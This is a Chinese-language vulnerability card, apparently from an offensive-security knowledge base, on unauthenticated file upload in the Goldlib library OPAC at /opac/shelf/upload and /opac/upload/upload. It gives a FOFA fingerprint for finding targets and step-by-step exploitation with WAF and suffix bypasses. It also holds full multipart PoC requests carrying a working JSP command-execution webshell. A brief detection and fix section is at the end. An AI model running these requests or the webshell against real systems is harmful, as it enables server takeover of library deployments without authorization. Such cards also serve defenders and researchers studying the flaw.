---
id: web-generic-file-upload-goldlib-opac-original-extension-upload
title: 金盘图书馆 OPAC 两处上传保留原始后缀：/opac/shelf/upload 与 /opac/upload/upload 任意扩展名落盘
type: scenario
domain: web
path: web/generic/file-upload
technique: goldlib-opac-original-extension-upload
tags:
- web
- file-upload
- java
- jsp
- webshell
- goldlib
- opac
- path-traversal
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V206
  verified_at: '2026-11-07T02:22:59+08:00'
  notes: 已对照原文与图18-20核对：ShelfController.uploadimg 取 imgFile、strPth=/pages/uploads/、generateFileName 保留 lastIndexOf('.') 后缀并 getRealPath 写盘；OpacUploadController.upload 为 GET /opac/upload/upload、saveFile=uploadTime+fileName.substring(indexOf(46))、落 static/uploads/yyyy/MM/dd/，与卡一致。原文未给出成功上传 JSP/落盘截图，接口可达性随 CAS/部署而变，卡内已注明；未复跑 PoC。
url: /docs/web/generic/file-upload/web-generic-file-upload-goldlib-opac-original-extension-upload/
draft: false
kb_aliases:
- 金盘图书馆任意文件上传
- goldlib uploadimg
- /opac/shelf/upload
- /opac/upload/upload
- generateFileName 后缀保留
- JSP webshell 上传
---

## 一句话结论

金盘图书馆 OPAC 的 `ShelfController.uploadimg`（`/opac/shelf/upload`）与 `OpacUploadController.upload`（`/opac/upload/upload`）都直接取客户端原始文件名的扩展名、只加时间戳/随机数改名，不做扩展名白名单、内容校验或鉴权，上传 `.jsp` 等可执行后缀即可落到 Web 目录 `/pages/uploads/` 或 `/static/uploads/` 下，进而 getShell。

## 原理

- **ShelfController.uploadimg**：`@RequestMapping({"/opac/shelf/upload"})`，从 multipart 取字段 `imgFile`，保存目录为 `request.getSession().getServletContext().getRealPath("/pages/uploads/")`；`fileName = file.getOriginalFilename()`，`generateFileName()` 只做 `yyyyMMddHHmmss + Random.nextInt(10000) + fileName.substring(fileName.lastIndexOf("."))`，即保留最后一个点之后的扩展名；随后 `new FileOutputStream(... + fileNewName)` 写入上传流。没有扩展名白名单、Content-Type/魔数校验，也没有对文件名做净化。
- **OpacUploadController.upload**：类映射 `/opac/upload`，方法映射 `/upload`（GET），遍历 `multipartRequest.getFileMap()`，`fileName = mf.getOriginalFilename()`；`uploadTime = new Date().getTime()`；`saveFile = uploadTime + fileName.substring(fileName.indexOf(46))`（46 是 `.`，从第一个点开始截取后缀）；保存目录为 `static/uploads/yyyy/MM/dd/`，再 `FileOutputStream` 写入。同样只改前缀不校验后缀。
- **鉴权缺口**：Shiro `filterChainDefinitions` 只把 `/admin/**` 设为 `user`，`/opac/**` 与 `/static/**` 未纳入；`CasHelperFilter` 的 `excludePrefixes` 只覆盖 `/logout,/assets,/scripts/,/interaction,/admin,/api/,/html,/ckeditor/uploader`，这两个上传接口不在排除列表也不在 Shiro 保护范围，实际可达性随部署（CAS 开关）而异，但代码层没有上传授权检查。
- **为什么能 RCE**：上传目录位于 Web 根下（`/pages/uploads/`、`/static/uploads/`），Tomcat/WebLogic 等容器会对 `.jsp`/`.jspx` 后缀解析执行；随机文件名不影响访问，响应/路径可预测（时间戳+随机数可枚举或从响应获取）。
- **补充**：`pages/admin/tools/uploadFile/doUpload.jsp` 的 `$uploadFile` 用黑名单 `jsp/aspx/php/class/bin/sh/bat`，但只检查原始文件名是否包含这些子串，作者也提示可尝试 `%6A%73%70`/Unicode 编码绕过；该处为二开逻辑且未实测，本卡不把它作为主链。

## 触发条件

- 目标为金盘图书馆 OPAC（FOFA 指纹 `/opac/search/autoFill?field=title`）。
- `/opac/shelf/upload` 或 `/opac/upload/upload` 可从外网/内网访问；CAS 未开启或该路径被放行。
- 上传目录在 Web 根下且容器解析 JSP/JSPX；或可上传 `.html/.svg` 形成存储型 XSS。
- 攻击者能构造 multipart 请求并指定 `filename` 后缀。

## 利用步骤

1. 用 FOFA 指纹定位目标，访问首页确认金盘 OPAC。
2. 探测上传接口：`POST /opac/shelf/upload`（字段 `imgFile` + `mapname`）或 `GET /opac/upload/upload`（字段 `file`）。
3. 先上传一张正常图片，记录响应中的 `filepath`/`data`，确认返回路径与保存目录；若响应不含路径，按 `yyyyMMddHHmmss+4位随机数` 与 `/pages/uploads/`/`/static/uploads/yyyy/MM/dd/` 规则枚举。
4. 上传 `shell.jsp`（内容为 JSP 命令执行/冰蝎/哥斯拉马），文件名任意，扩展名保留 `.jsp`。
5. 访问返回的 URL（如 `/pages/uploads/202511071230451234.jsp`）触发 JSP 执行；用 `cmd=id`/`whoami` 验证。
6. 若 `.jsp` 被 WAF/容器拦截，尝试 `.jspx`、`.jspf`、大小写/双写后缀或上传 `.html` 做存储型 XSS（视解析规则）。

## PoC

```http
POST /opac/shelf/upload HTTP/1.1
Host: target.example
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="imgFile"; filename="shell.jsp"
Content-Type: image/jpeg

<%@ page import="java.util.*,java.io.*" %><% if(request.getParameter("cmd")!=null){ Process p=Runtime.getRuntime().exec(request.getParameter("cmd")); BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream())); String l; while((l=br.readLine())!=null){ out.println(l);} } %>
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="mapname"

testmap
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

```http
GET /opac/upload/upload HTTP/1.1
Host: target.example
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryABC123

------WebKitFormBoundaryABC123
Content-Disposition: form-data; name="file"; filename="shell.jsp"
Content-Type: text/plain

[同上 JSP 内容]
------WebKitFormBoundaryABC123--
```

```text
# 访问响应返回的 /pages/uploads/<timestamp><rand>.jsp 或 /static/uploads/yyyy/MM/dd/<timestamp>.jsp?cmd=id
```

## 变体与关联

- 变体：`OpacUploadController` 用 `fileName.indexOf(46)` 取第一个点后的全部字符；`a.b.jsp` 会变成 `<ts>.b.jsp`，仍以 `.jsp` 结尾，白名单若只看第一段可能被绕过。
- 变体：若 JSP 解析被禁用，上传 `.html`/`.svg` 可做存储型 XSS；上传 `.war`/`.jar` 视容器部署权限可能进一步利用。
- 变体：`doUpload.jsp` 黑名单可用 URL 编码/Unicode/大小写/双写绕过，但未实测，作为后续验证点。
- 关联：[[web-generic-file-upload-laravel-unauth-uploadphoto-extension-webshell]]（原始后缀上传）、[[web-generic-file-upload-aspnet-avatar-extension-aspx-webshell]]（头像上传改后缀）、[[web-java-framework-shiro-spring-path-auth-bypass]]（`/admin;/` 等 Shiro/Spring 路径绕过，可用于访问受保护上传）。
- 边界：上传目录必须在 Web 根且容器解析对应后缀；若接口被 WAF 拦截或目录不可执行，只能造成存储型 XSS/文件覆盖。

## 检测与防御

- 检测：对 `/opac/shelf/upload`、`/opac/upload/upload` 的上传请求检查扩展名与 Content-Type；监控 `/pages/uploads/`、`/static/uploads/` 下新增的 `.jsp/.jspx/.war` 文件；WAF 规则拦截 multipart 中的可执行后缀。
- 修复：服务端生成随机文件名并强制安全扩展名（按内容类型映射），禁止客户端后缀；上传目录移出 Web 根或禁止脚本解析；上传接口增加鉴权与权限校验。
- 加固：容器禁止上传目录执行 JSP；文件内容做魔数/图片解码校验；对上传响应不回显可预测路径。
